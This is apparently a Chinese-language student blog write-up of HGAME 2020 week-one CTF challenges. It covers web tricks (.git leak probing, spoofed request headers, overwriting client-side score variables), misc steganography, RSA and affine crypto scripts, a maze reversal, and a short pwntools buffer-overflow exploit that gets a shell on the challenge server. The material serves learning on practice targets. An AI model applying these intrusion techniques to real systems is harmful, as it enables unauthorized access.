[{"title":"hgame2020week1_wp","url":"/2020/01/25/hgame2020week1-wp/","content":"  \n感谢出题人的耐心解答...  \n= =可惜大二了才刚刚开始....  \npy出题人虽然可耻但有用(X\n\n## web  \n### Cosmos的博客  \n![](01.png)\n.git源码泄露   \npayload：http://cosmos.hgame.n3ko.co/.git/config  \n![](03.png)\n把github上的仓库git clone下来再进行回滚  \ngit clone https://github.com/FeYcYodhrPDJSru/8LTUKCL83VLhXbc  \ncd 8LTUKCL83VLhXbc  \ngit log  \n![](04.png)\ncommit 后面就是对应的版本id  \n![](05.png)\nBase64解码之后就可以得到flag\n\n### 接头霸王  \n看见题目就想到请求头，用postman一步步进行修改\n![](06.png)\n根据提示在请求头中一步步添加  \nreferer:https://vidar.club/  \nX-Forwarded-For:127.0.0.1(You need to visit locally)  \nUser-Agent：Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Cosmos/78.0.3904.108 Safari/537.36(use Cosmos Brower)\n之后提示\n![](11.png)\n看一下响应头\n![](12.png)\n![](08.png)\n因为请求方式是POST，所以 if-Unmodified-Since:Tue,15 Nov 2099 00:00:00 GMT  \n\n### Code World  \nf12看源码\n![](14.png)\n发现提示，用burpsuite抓包\n![](15.png)  \n![](45.png)\n405是指method not allowed，所以把get改成post\n![](17.png)\n因为+会被当作空格处理，所以用url的%2b\n![](18.png)\n\n### 鸡尼泰玫  \n发现是个小游戏，先玩一下，输掉之后发现有提示：积分达到30000才能拿到flag  \nF12看一下源码\n![](13.png)\n在console中直接输入storageScore=30000;globalScore=30000，覆盖原值  \n再开始玩游戏，直接输掉之后积分超过30000了，就可以看到flag\n\n## Misc  \n### 欢迎参加HGame！  \n看这个字符串以为是什么特殊的编码，google搜不到就百度一下  \n用base64解码，解出来是morse码，再在线解一下就可以得到flag  \n### 壁纸  \nwinhex打开后发现含有flag.txt文件并且尾部有提示：passsword is picture ID  \n后来才知道这个id指的是p站上的图片id…  \n图片里有个压缩包(PK开头)  \nforemost 图片名.jpg  \n分离得到一个加密压缩包，输入图片id  \ntxt里是unicode码，在线解码下得到flag   \n### 克苏鲁神话  \n打开bacon.txt，看名字是培根加密  \n![](22.png)\n根据这个解密，得到flaghiddenindoc这个提示，但是这个不是密码  \n后来搜索到明文攻击，用zip不行所以用7z  \n解压后得到一个doc文件，选择隐藏文字功能flag就可以显示了    \n### 签到题ProPlus  \n根据提示进行栅栏解密，凯撒解密，密码为大写\n![](23.png)\n解压之后得到OK.txt，在线okk解码，发现base32的提示，base32解码后再base64，再转换为文本，发现开头是png，于是转成16进制，复制进winhex保存为png可得二维码，扫一下就有flag了  \n### 每日推荐  \n（感谢出题人的耐心解答qwq）  \n（一开始直接用foremost分离文件，再winrar修复文件是不行的…）  \n通过foremost可以看到里边有zip文件  \n在wireshark里打开后，搜索zip，找到了对应的包  \n![](26.png)\n导出后发现有提示密码为六位数字，用AAPR爆破得到密码  \n解压后得到一个mp3文件，用audacity打开，目测一下波形没什么奇怪的地方（还挺好听\n再看看频谱图得到flag  \n## Crypto  \n### infantRSA  \n给出数据如下  \np = 681782737450022065655472455411;  \nq = 675274897132088253519831953441;  \ne = 13;  \nc=pow(m,e,p * q)=275698465082361070145173688411496311542172902608559859019841  \n![](24.png)\n所以已知pqec的话先求出d，再求m就好  \n```python\nimport gmpy2\n\np=681782737450022065655472455411\nq=675274897132088253519831953441\ne=13\nc=275698465082361070145173688411496311542172902608559859019841\ns=(p-1)*(q-1)\nd=long(gmmpy2.invert(e,s))\nn=p*q\nm=pow(c,d,n)\nres=m.to_bytes(m.bit_length(),byteorder='big')\nprint(res)\n```\n### Affine\n这题直接改了网上的脚本  \na.b.flag都是未知的，但是我们知道密文和明文中的hgame，于是先求a和b\n```python\nimport gmpy2\nfrom Crypto.Util.number inverse\n\nTABLE = 'zxcvbnmasdfghjklqwertyuiop1234567890QWERTYUIOPASDFGHJKLZXCVBNM'\nMOD = len(TABLE)\n\npre=[12,11,7,6,18]\npost=[46,33,43,30,0]\nfor a in range(MOD):\n\tif GCD(a,MOD)!=1:\n\t\tcontinue\n\tinv_a=inverse(a,MOD)\n\tfor b in range(MOD):\n\t\tq=1\n\t\tfor i in range(5):\n\t\t\tif(inv_a*(post[i]-b))%MOD!=pre[i]:\n\t\t\t\tq=0\n\t\t\t\tbreak\n\t\tif(q):\n\t\t\tprint(a,b)\n\t\t\t#13,14\n```\nab求出后可以求得完整的明文\n```python\nimport gmpy2\nfrom Crypto.Util.number inverse\n\nTABLE = 'zxcvbnmasdfghjklqwertyuiop1234567890QWERTYUIOPASDFGHJKLZXCVBNM'\nMOD = len(TABLE)\na=13\nb=14\ninv_a=inverse(a,MOD)\ncipher='A8I5z{xr1A_J7ha_vG_TpH410}'\nflag=''\nfor p in cipher:\n\ti=TABLE.find(p)\n\tif i==-1:\n\t\tflag+=p\n\telse:\n\t\tii=(inv_a*(i-b))%MOD\n\t\tflag+=TABLE[ii]\nprint(flag)\n```\n### Reorder\n这题一开始是真的懵比…..后来问了一下lurk  \n发现输入某个字符后，返回后的字符所在位置就是所对应的密文  \n![](00.png)\n输入  \n0  \n00  \n000  \n0000  \n00000  \n发现返回的位置和hgame相对应，之后一直添加输入数量，再观察每次新增的位置所对应的字符就好啦~  \n## PWN\n### Hard_AAAAA\n感谢C老板的耐心解答，顺便把坑都踩了一遍….  \n下载之后先例常checksec（感觉保护开没开其实影响不是很大…..也可能是因为我不懂） \nIda启动！f5！  \n![](31.png)\n![](32.png)\n可以通过gets()使得s溢出覆盖v5的值，从而满足if内的条件，执行backdoor()函数  \ns与v5的相对距离为0xAC-0x31,这一段用随便什么数据填充:’a’ * (0xAC-0x31)  \n之后要满足memcmp的条件即memcmp(“0O0o”,&v5,7u)==0  \n在7个内存单元内，v5能和“0O0o”相等（….没注意到7…）  \n双击memcmp中的“0O0o”，跳转  \n![](33.png)\n发现和”O0”相邻，就是说比较完“0O0o”后会继续比较“O0”  \n所以构造payload=’a’ * (0xAC-0x31)+’ 0O0o\\00O0’(之前还打成了’0O0o\\\\\\00O0’,我是真的蠢)  \n```python\nfrom pwn import *\np=remote(\"47.103.214.163\",\"20000\")\np.recvuntil(\"Let's 0O0o\\\\0O0!\")\npayload='a'*(0xAC-0x31)+'0O0o\\00O0'\np.sendline(payload)\np.interactive()\n```\n连上后输入ls查看目录，发现有个flag，再cat flag读取内容就好了  \n## Reverse\n### maze\nIda启动！f5！  \n![](39.png)\n猜测是方向键，选中数字按R后就会变成dswa(常用方向键)  \n![](40.png)\n![](41.png)\n代码给出了迷宫范围(上下限)以及v5要走的路线(0上)  \n先看看v5的行走范围，即迷宫地图，点进unk_602080 \n\n![](42.png)  \n\n长这样，选中unk_602080和unk_    60247C间的内容按a可以简单合并一下，标记好出口和入口位置  \n通过代码分析，上下移动对应64个step，左右对应4个，所以删除掉多余的数据（我是手动删….）  \n![](44.png)\n其中上边的(0是入口，最后的(0是出口，可以很明显看到走出迷宫的路径  \n行走的方向键加上hgame{}就是flag\n","tags":["wp","ctf","vidar"]}]